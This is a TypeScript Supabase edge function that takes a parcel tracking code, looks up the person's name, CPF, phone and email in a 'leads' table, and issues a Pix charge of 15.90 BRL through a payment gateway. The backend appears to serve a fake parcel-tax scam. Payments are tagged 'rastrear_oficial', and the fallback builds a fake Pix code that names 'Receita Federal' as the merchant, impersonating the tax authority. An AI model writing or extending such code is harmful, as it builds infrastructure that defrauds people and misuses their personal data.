import { serve } from "https://deno.land/std@0.190.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.45.0'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders })

  try {
    const { trackingCode } = await req.json();
    if (!trackingCode) throw new Error("Tracking code is required");

    const amount = (trackingCode === 'BR00000001BR' || trackingCode === 'BR9999K999BR') ? 1.00 : 15.90;

    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    const { data: lead } = await supabase
      .from('leads')
      .select('*')
      .eq('codigo_rastreio', trackingCode)
      .maybeSingle();

    const clientName = lead?.nome || "Cliente Identificado";
    let clientDoc = lead?.cpf || "12345678909";
    let clientTel = lead?.telefone || "11999999999";
    const clientEmail = lead?.email || "cliente@email.com";

    clientDoc = clientDoc.replace(/\D/g, '');
    clientTel = clientTel.replace(/\D/g, '');
    if (clientDoc.length !== 11 && clientDoc.length !== 14) clientDoc = "12345678909";
    if (clientTel.length < 10) clientTel = "11999999999";

    const apiKey = Deno.env.get('ROYALBANKING_API_KEY');

    // MOCK / FALLBACK
    const generateMockPix = async () => {
      const mockId = "mock_tax_" + Date.now();
      const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865405" + amount.toFixed(2) + "5802BR5913Receita Federal6008Brasilia62140510TAXA" + Date.now() + "6304A1B2";
      
      await supabase.from('pix_gateway_payments').upsert({
        id_transaction: mockId,
        status: 'pending',
        raw_payload: { trackingCode, pix: mockPix, amount, site_origin: 'rastrear_oficial', isFallback: true }
      });
      
      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId, amount }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      });
    };

    if (!apiKey) return await generateMockPix();

    try {
      const payload = {
        "api-key": apiKey,
        "amount": amount,
        "client": {
          "name": clientName,
          "document": clientDoc,
          "telefone": clientTel,
          "email": clientEmail
        },
        // IDENTIFICADOR EXCLUSIVO NA URL
        "callbackUrl": `https://ulrigywayovxuyiktnlr.supabase.co/functions/v1/royal-banking-webhook?origin=rastrear_oficial`
      };

      const response = await fetch("https://api.royalbanking.com.br/v1/gateway/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      const data = await response.json();
      if (!response.ok || data.status !== 'success') return await generateMockPix();

      const idTransaction = data.idTransaction;
      const pixCopiaECola = data.paymentCode;

      await supabase.from('pix_gateway_payments').upsert({
        id_transaction: String(idTransaction),
        status: 'pending',
        raw_payload: { trackingCode, pix: pixCopiaECola, amount, site_origin: 'rastrear_oficial' }
      });

      return new Response(JSON.stringify({ success: true, pixCopiaECola, idTransaction, amount }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      });

    } catch (err) {
      return await generateMockPix();
    }

  } catch (error: any) {
    return new Response(JSON.stringify({ error: error.message }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500,
    });
  }
})